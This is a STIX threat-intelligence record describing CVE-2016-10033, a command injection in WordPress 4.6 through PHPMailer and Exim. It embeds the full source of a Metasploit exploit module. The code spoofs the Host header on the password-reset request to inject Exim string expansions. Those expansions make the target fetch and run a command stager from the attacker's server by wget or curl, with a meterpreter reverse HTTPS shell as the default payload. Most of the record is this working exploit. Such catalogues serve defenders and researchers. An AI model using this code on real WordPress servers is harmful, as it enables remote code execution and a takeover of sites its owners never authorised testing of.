{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--385f816f-5df2-4d46-adc6-e8b0cbf7d2ab",
    "created": "2024-08-14T17:12:01.271727Z",
    "modified": "2024-08-14T17:12:01.271731Z",
    "name": "WordPress PHPMailer Host Header Command Injection",
    "description": " This module exploits a command injection vulnerability in WordPress version 4.6 with Exim as an MTA via a spoofed Host header to PHPMailer a mail-sending library that is bundled with WordPress.  A valid WordPress username is required to exploit the vulnerability. Additionally, due to the altered Host header, exploitation is limited to the default virtual host, assuming the header isn't mangled in transit.  If the target is running Apache 2.2.32 or 2.4.24 and later, the server may have HttpProtocolOptions set to Strict, preventing a Host header containing parens from passing through, making exploitation unlikely. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/wp_phpmailer_host_header.rb",
            "external_id": "wp_phpmailer_host_header.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-10033"
        },
        {
            "source_name": "reference",
            "url": "https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html"
        },
        {
            "source_name": "reference",
            "url": "http://www.exim.org/exim-html-current/doc/html/spec_html/ch-string_expansions.html"
        },
        {
            "source_name": "reference",
            "url": "https://httpd.apache.org/docs/2.4/mod/core.html#httpprotocoloptions"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'                => 'WordPress PHPMailer Host Header Command Injection',\n      'Description'         => %q{\n        This module exploits a command injection vulnerability in WordPress\n        version 4.6 with Exim as an MTA via a spoofed Host header to PHPMailer,\n        a mail-sending library that is bundled with WordPress.\n\n        A valid WordPress username is required to exploit the vulnerability.\n        Additionally, due to the altered Host header, exploitation is limited to\n        the default virtual host, assuming the header isn't mangled in transit.\n\n        If the target is running Apache 2.2.32 or 2.4.24 and later, the server\n        may have HttpProtocolOptions set to Strict, preventing a Host header\n        containing parens from passing through, making exploitation unlikely.\n      },\n      'Author'              => [\n        'Dawid Golunski', # Vulnerability discovery\n        'wvu'             # Metasploit module\n      ],\n      'References'          => [\n        ['CVE', '2016-10033'],\n        ['URL', 'https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html'],\n        ['URL', 'http://www.exim.org/exim-html-current/doc/html/spec_html/ch-string_expansions.html'],\n        ['URL', 'https://httpd.apache.org/docs/2.4/mod/core.html#httpprotocoloptions']\n      ],\n      'DisclosureDate'      => '2017-05-03',\n      'License'             => MSF_LICENSE,\n      'Platform'            => 'linux',\n      'Arch'                => [ARCH_X86, ARCH_X64],\n      'Privileged'          => false,\n      'Targets'             => [\n        ['WordPress 4.6 / Exim', {}]\n      ],\n      'DefaultTarget'       => 0,\n      'DefaultOptions'      => {\n        'PAYLOAD'           => 'linux/x64/meterpreter_reverse_https',\n        'CMDSTAGER::FLAVOR' => :wget\n      },\n      'CmdStagerFlavor'     => %i[wget curl]\n    ))\n\n    register_options([\n      OptString.new('USERNAME', [true, 'WordPress username', 'admin'])\n    ])\n\n    register_advanced_options([\n      OptString.new('WritableDir', [true, 'Writable directory', '/tmp'])\n    ])\n\n    deregister_options('VHOST', 'URIPATH')\n  end\n\n  def check\n    if (version = wordpress_version)\n      version = Rex::Version.new(version)\n    else\n      return CheckCode::Safe\n    end\n\n    vprint_status(\"WordPress #{version} installed at #{full_uri}\")\n\n    if version <= Rex::Version.new('4.6')\n      CheckCode::Appears\n    else\n      CheckCode::Detected\n    end\n  end\n\n  def exploit\n    if check == CheckCode::Safe\n      print_error(\"Is WordPress installed at #{full_uri} ?\")\n      return\n    end\n\n    # Since everything goes through strtolower(), we need lowercase\n    print_status(\"Generating #{cmdstager_flavor} command stager\")\n    @cmdstager = generate_cmdstager(\n      'Path'   => \"/#{Rex::Text.rand_text_alpha_lower(8)}\",\n      :temp    => datastore['WritableDir'],\n      :file    => File.basename(cmdstager_path),\n      :nospace => true\n    ).join(';')\n\n    print_status(\"Generating and sending Exim prestager\")\n    generate_prestager.each do |command|\n      vprint_status(\"Sending #{command}\")\n      send_request_payload(command)\n    end\n  end\n\n  #\n  # Exploit methods\n  #\n\n  # Absolute paths are required for prestager commands due to execve(2)\n  def generate_prestager\n    prestager = []\n\n    # This is basically sh -c `wget` implemented using Exim string expansions\n    # Badchars we can't encode away: \\ for \\n (newline) and : outside strings\n    prestager << '/bin/sh -c ${run{/bin/echo}{${extract{-1}{$value}' \\\n      \"{${readsocket{inet:#{srvhost_addr}:#{srvport}}\" \\\n      \"{get #{get_resource} http/1.0$value$value}}}}}}\"\n\n    # CmdStager should rm the file, but it blocks on the payload, so we do it\n    prestager << \"/bin/rm -f #{cmdstager_path}\"\n  end\n\n  def send_request_payload(command)\n    res = send_request_cgi(\n      'method'        => 'POST',\n      'uri'           => wordpress_url_login,\n      'headers'       => {\n        'Host'        => generate_exim_payload(command)\n      },\n      'vars_get'      => {\n        'action'      => 'lostpassword'\n      },\n      'vars_post'     => {\n        'user_login'  => datastore['USERNAME'],\n        'redirect_to' => '',\n        'wp-submit'   => 'Get New Password'\n      }\n    )\n\n    if res && !res.redirect?\n      if res.code == 200 && res.body.include?('login_error')\n        fail_with(Failure::NoAccess, 'WordPress username may be incorrect')\n      elsif res.code == 400 && res.headers['Server'] =~ /^Apache/\n        fail_with(Failure::NotVulnerable, 'HttpProtocolOptions may be Strict')\n      else\n        fail_with(Failure::UnexpectedReply, \"Server returned code #{res.code}\")\n      end\n    end\n\n    res\n  end\n\n  def generate_exim_payload(command)\n    exim_payload  = Rex::Text.rand_text_alpha(8)\n    exim_payload << \"(#{Rex::Text.rand_text_alpha(8)} \"\n    exim_payload << \"-be ${run{#{encode_exim_payload(command)}}}\"\n    exim_payload << \" #{Rex::Text.rand_text_alpha(8)})\"\n  end\n\n  # We can encode away the following badchars using string expansions\n  def encode_exim_payload(command)\n    command.gsub(/[\\/ :]/,\n      '/' => '${substr{0}{1}{$spool_directory}}',\n      ' ' => '${substr{10}{1}{$tod_log}}',\n      ':' => '${substr{13}{1}{$tod_log}}'\n    )\n  end\n\n  #\n  # Utility methods\n  #\n\n  def cmdstager_flavor\n    datastore['CMDSTAGER::FLAVOR']\n  end\n\n  def cmdstager_path\n    @cmdstager_path ||=\n      \"#{datastore['WritableDir']}/#{Rex::Text.rand_text_alpha_lower(8)}\"\n  end\n\n  #\n  # Override methods\n  #\n\n  # Return CmdStager on first request, payload on second\n  def on_request_uri(cli, request)\n    if @cmdstager\n      print_good(\"Sending #{@cmdstager}\")\n      send_response(cli, @cmdstager)\n      @cmdstager = nil\n    else\n      print_good(\"Sending payload #{datastore['PAYLOAD']}\")\n      super\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-05-03",
    "x_mitre_platforms": [
        "linux'"
    ]
}